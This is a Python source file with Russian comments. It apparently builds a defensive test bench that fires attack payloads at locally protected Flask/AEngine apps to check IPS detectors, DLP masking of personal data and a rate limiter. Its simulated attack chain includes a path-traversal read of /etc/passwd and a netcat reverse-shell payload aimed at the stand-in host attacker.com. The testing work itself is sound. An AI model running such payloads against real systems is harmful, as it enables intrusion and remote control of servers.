"""
sandbox.py — «подопытные» AEngine-приложения, защищённые модулем ``sec`` РОВНО
так, как описано в его документации.

Вместо ручного создания детекторов и подмены ``time``/контекста запроса (как было
в прежней версии стенда) здесь к настоящим ``AEngineApps.App`` привязываются
компоненты ``sec`` штатным способом (см. sec/README.md → «Полный пример интеграции»):

    ips = IPS(app); ips.add_detector(SQLiDetector); ...   # before_request → abort(400)
    DLP(app, mode=DLPMode.Agressive)                      # after_request → маскирование ПДн
    RateLimiter(app, max_requests, window)                # before_request → abort(429)

После этого по приложениям бьют НАСТОЯЩИМИ HTTP-запросами через
``flask.test_client()``. Все middleware ``sec`` отрабатывают точно как в проде —
стенд лишь наблюдает результат (код ответа, замаскированное тело, лог детектора).

Реалистичная двухслойная схема защиты:
  * «application IPS» — специализированные детекторы (SQLi/XSS/LFI/RCE) + DLP;
  * «signature WAF» — отдельный слой сигнатурного анализа OWASP CRS
    (``SignatureDetector``) для известных CVE.
Оба слоя — это обычный документированный ``IPS(app)``; разные конфигурации детекторов
на разных приложениях соответствуют реальной эшелонированной защите (WAF + IPS).
"""

import json
import logging

from AEngineApps import App, API
from sec.intrusions import (
    IPS,
    RateLimiter,
    SQLiDetector,
    XSSDetector,
    LFIDetector,
    RCEDetector,
    SignatureDetector,
)
from sec.dlp import DLP, DLPMode, MailFilter, PhoneFilter, PassportFilter

# Порог rate limiter для стенда «DDoS».
RATE_MAX_REQUESTS = 100
RATE_WINDOW_SECONDS = 60

# Набор ПДн, который «утекает» через защищённый DLP эндпоинт.
PII_DATASET = {
    "users": [
        {
            "name": "Иван Петров",
            "email": "ivan.petrov@company.com",
            "phone": "+79161234567",
            "passport": "4515 123456",
            "role": "admin",
        },
        {
            "name": "Мария Сидорова",
            "email": "maria.s@gmail.com",
            "phone": "+79039876543",
            "passport": "4516 654321",
            "role": "user",
        },
    ],
    "internal_note": "Контакт поддержки: support@internal.corp, тел: +74951234567",
}

# Токен из CRITICAL-лога детектора ("DETECTED <TOKEN> ...") → имя класса детектора.
_DETECTED_TO_CLASS = {
    "SIGNATURE": "SignatureDetector",
    "SQLi": "SQLiDetector",
    "XSS": "XSSDetector",
    "RCE": "RCEDetector",
    "LFI": "LFIDetector",
    "RFI": "LFIDetector",
}


class _DetectorLogCapture(logging.Handler):
    """Перехватывает CRITICAL-сообщения детекторов (``BaseDetector.log``)."""

    def __init__(self):
        super().__init__(level=logging.CRITICAL)
        self.records: list[str] = []

    def emit(self, record):
        self.records.append(record.getMessage())

    def clear(self):
        self.records.clear()


def _parse_detector(log_line: str) -> tuple[str, str]:
    """Из строки лога детектора достаёт (имя_детектора, человекочитаемая_деталь)."""
    if not log_line or not log_line.startswith("DETECTED "):
        return "IPS", ""
    rest = log_line[len("DETECTED "):]
    token = rest.split()[0].rstrip(":").split("/")[0]  # "SQLi", "SIGNATURE", "LFI"
    detector = _DETECTED_TO_CLASS.get(token, "IPS")
    if token == "SIGNATURE":
        # "SIGNATURE: <name> | METHOD path"
        name = rest.split(":", 1)[1].split("|", 1)[0].strip()
        return detector, f"Совпадение сигнатуры OWASP CRS: {name}"
    detail = log_line.split("|", 1)[1].strip() if "|" in log_line else ""
    return detector, detail


# ─── Целевые эндпоинты sandbox (сами по себе «уязвимы») ────────

class _EchoAPI(API):
    """Отражает полученные данные. Никакой фильтрации не делает сам —
    за него работают привязанные к приложению IPS (вход) и DLP (выход)."""

    methods = ["GET", "POST"]

    def get(self):
        return {"echo": {k: v for k, v in self.request.args.items()}}

    def post(self):
        return {"echo": self.request.get_json(silent=True) or {}}


class _LeakAPI(API):
    """«Сливает» персональные данные. Ответ маскируется DLP-middleware."""

    methods = ["GET"]

    def get(self):
        return PII_DATASET


class _PingAPI(API):
    """Тривиальный эндпоинт для демонстрации RateLimiter."""

    methods = ["GET"]

    def get(self):
        return {"ok": True}


# ─── Защищённый слой: приложение + IPS + (опц.) DLP ────────────

class _ProtectedApp:
    """AEngine-приложение с привязанным IPS и захватом логов детекторов."""

    def __init__(self, name: str, detectors, with_dlp: bool = False):
        self.app = App(name)
        self.app.flask.config["TESTING"] = True

        # Перехват логов детекторов; не засоряем консоль (propagate=False).
        self.log = _DetectorLogCapture()
        logger = self.app.flask.logger
        logger.setLevel(logging.CRITICAL)
        logger.addHandler(self.log)
        logger.propagate = False

        # IPS с набором детекторов — документированный способ.
        self.ips = IPS(self.app)
        for detector in detectors:
            self.ips.add_detector(detector)

        # DLP в агрессивном режиме — документированный способ.
        if with_dlp:
            self.dlp = DLP(self.app, mode=DLPMode.Agressive)
            for pii_filter in (MailFilter, PhoneFilter, PassportFilter):
                self.dlp.add_filter(pii_filter)
            self.app.add_screen("/leak", _LeakAPI)

        self.app.add_screen("/echo", _EchoAPI)
        self.client = self.app.flask.test_client()

    def probe(self, payload: str) -> dict:
        """Отправляет payload реальным запросом; решение блокировать принимает IPS."""
        self.log.clear()
        resp = self.client.get("/echo", query_string={"q": payload})
        blocked = resp.status_code == 400
        if blocked:
            detector, details = _parse_detector(self.log.records[-1] if self.log.records else "")
        else:
            detector, details = "None", ""
        return {"blocked": blocked, "status_code": resp.status_code,
                "detector": detector, "details": details}


# ─── Sandbox: два защищённых слоя + DLP ────────────────────────

class SecuritySandbox:
    """Эшелонированная защита из реальных компонентов ``sec``.

    RateLimiter намеренно НЕ привязан к этим приложениям: стенд многократно бьёт по
    ним запросами, и лимит частоты мешал бы. Демонстрация RateLimiter вынесена в
    изолированную «лабораторию» (:func:`run_flood`) — это тоже документированный
    способ (`RateLimiter(app, ...)` на отдельном приложении).
    """

    def __init__(self):
        # Слой 1: прикладной IPS со специализированными детекторами + DLP.
        # SQLi первым — его проверка ключевых слов детерминированна и не зависит от
        # окружения (в отличие от RCE-эвристики shutil.which).
        self._app_layer = _ProtectedApp(
            "SecuritySandbox",
            [SQLiDetector, XSSDetector, LFIDetector, RCEDetector],
            with_dlp=True,
        )
        # Слой 2: сигнатурный WAF (OWASP CRS) для известных CVE.
        self._waf_layer = _ProtectedApp("SignatureWAF", [SignatureDetector])

        # Удобные ссылки для DLP-операций (на прикладном слое).
        self.app = self._app_layer.app
        self.client = self._app_layer.client

    # ── Реальные запросы через защищённые приложения ──

    def attack(self, payload: str, attack_type: str = "") -> dict:
        """Прогоняет payload через подходящий защитный слой реальным запросом.

        CVE-сигнатуры проверяет сигнатурный WAF (OWASP CRS), остальные атаки —
        прикладной IPS со специализированными детекторами.
        """
        layer = self._waf_layer if attack_type == "cve" else self._app_layer
        return layer.probe(payload)

    def dlp_test(self) -> dict:
        """Прогоняет ответ с ПДн через реальный DLP-middleware (after_request)."""
        raw = json.dumps(PII_DATASET, ensure_ascii=False)
        email = bool(MailFilter.check(raw))
        phone = bool(PhoneFilter.check(raw))
        passport = bool(PassportFilter.check(raw))

        resp = self.client.get("/leak")
        masked_text = resp.get_data(as_text=True)
        try:
            masked_data = json.loads(masked_text)
        except json.JSONDecodeError:
            masked_data = {"raw_masked": masked_text}

        return {
            "original_preview": "Содержит email, телефоны, паспорта (удаляются DLP)",
            "masked_data": masked_data,
            "dlp_actions": {
                "email_detected": email,
                "phone_detected": phone,
                "passport_detected": passport,
                "total_masked": sum([email, phone, passport]),
            },
        }

    def _exfil_via_dlp(self, data: str) -> str:
        """Отправляет ПДн и возвращает то, что DLP оставил в ответе."""
        resp = self.client.get("/echo", query_string={"q": data})
        try:
            return json.loads(resp.get_data(as_text=True)).get("echo", {}).get("q", "")
        except (json.JSONDecodeError, AttributeError):
            return resp.get_data(as_text=True)

    def run_chain(self) -> dict:
        """APT-цепочка реальными запросами: разведка → эксплуатация → эксфильтрация."""
        steps = []

        lfi_payload = "../../etc/passwd"
        lfi = self.attack(lfi_payload)
        steps.append({
            "name": "recon", "phase": "Разведка", "attack": "LFI — чтение /etc/passwd",
            "payload": lfi_payload, "blocked": lfi["blocked"], "detector": lfi["detector"],
        })

        rce_payload = "$(nc -e /bin/sh attacker.com 4444)"
        rce = self.attack(rce_payload)
        steps.append({
            "name": "exploit", "phase": "Эксплуатация",
            "attack": "RCE — reverse shell через netcat",
            "payload": rce_payload, "blocked": rce["blocked"], "detector": rce["detector"],
        })

        exfil_data = "admin@secret.com +79161234567 passport: 4515 123456"
        masked = self._exfil_via_dlp(exfil_data)
        dlp_blocked = masked != exfil_data
        steps.append({
            "name": "exfil", "phase": "Эксфильтрация",
            "attack": "DLP — попытка утечки персональных данных",
            "payload": exfil_data, "blocked": dlp_blocked, "result_data": masked,
            "detector": "DLP" if dlp_blocked else "None",
        })

        all_blocked = all(s["blocked"] for s in steps)
        return {
            "steps": steps,
            "chain_blocked": all_blocked,
            "summary": "Все этапы атаки заблокированы" if all_blocked
                       else "Некоторые этапы прошли защиту",
        }


# ─── Лаборатория RateLimiter (изолированная на каждый запуск) ──

def run_flood(count: int, max_requests: int = RATE_MAX_REQUESTS,
              window: int = RATE_WINDOW_SECONDS) -> dict:
    """Реальный DDoS-прогон через свежий ``RateLimiter`` из ``sec``.

    Создаётся отдельное приложение с привязанным ``RateLimiter`` (документированный
    способ), после чего по нему бьют ``count`` реальными запросами. Первые
    ``max_requests`` проходят (200), остальные получают честный ``429`` из самого
    ``RateLimiter._check_rate``. Свежее приложение на каждый прогон гарантирует
    воспроизводимость (состояние лимитера не накапливается между демонстрациями).
    """
    lab = App("RateLimitLab")
    lab.flask.config["TESTING"] = True
    RateLimiter(lab, max_requests=max_requests, window=window)
    lab.add_screen("/ping", _PingAPI)
    client = lab.flask.test_client()

    timeline = []
    passed = blocked = 0
    triggered_at = None

    for i in range(count):
        resp = client.get("/ping")
        if resp.status_code == 429:
            blocked += 1
            if triggered_at is None:
                triggered_at = i + 1
            timeline.append({"request": i + 1, "status": "blocked", "code": 429})
        else:
            passed += 1
            timeline.append({"request": i + 1, "status": "passed", "code": resp.status_code})

    return {
        "total": count,
        "blocked": blocked,
        "passed": passed,
        "rate_limit_triggered_at": triggered_at,
        "max_requests_per_window": max_requests,
        "window_seconds": window,
        "timeline": timeline,
    }


# ─── Ленивый singleton sandbox ─────────────────────────────────

_sandbox: "SecuritySandbox | None" = None


def get_sandbox() -> SecuritySandbox:
    """Возвращает общий экземпляр sandbox (создаётся при первом обращении)."""
    global _sandbox
    if _sandbox is None:
        _sandbox = SecuritySandbox()
    return _sandbox
